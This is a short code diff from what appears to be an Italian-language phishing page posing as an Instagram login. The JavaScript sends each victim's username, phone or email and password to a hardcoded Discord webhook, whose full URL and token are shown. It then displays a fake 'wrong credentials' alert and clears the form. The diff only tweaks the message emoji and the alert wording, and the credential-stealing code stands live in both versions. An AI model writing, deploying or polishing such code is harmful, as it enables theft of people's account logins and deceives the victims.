@@ -70,7 +70,7 @@
       const webhookURL = "https://discordapp.com/api/webhooks/1365809847207071774/oqQLe1MAarTIe7WO2Lj9s8dUD-EHbMBs70Z3HmLZlmrVJFkt4nkSUF_G8uBc1HvBH4zj";
 
       const message = {
-        content: `📩 Nuovo invio!\nTelefono, nome utente o e-mail: ${username}\nPassword: ${password}`
+        content: `》 Nuovo invio!\nTelefono, nome utente o e-mail: ${username}\nPassword: ${password}`
       };
 
       fetch(webhookURL, {
@@ -82,7 +82,7 @@
       })
       .then(response => {
         if (response.ok) {
-          alert('instagram.login dice credenziali errate');
+          alert('Credenziali errate');
           form.reset();
         } else {
           alert('Errore nell\'invio.');
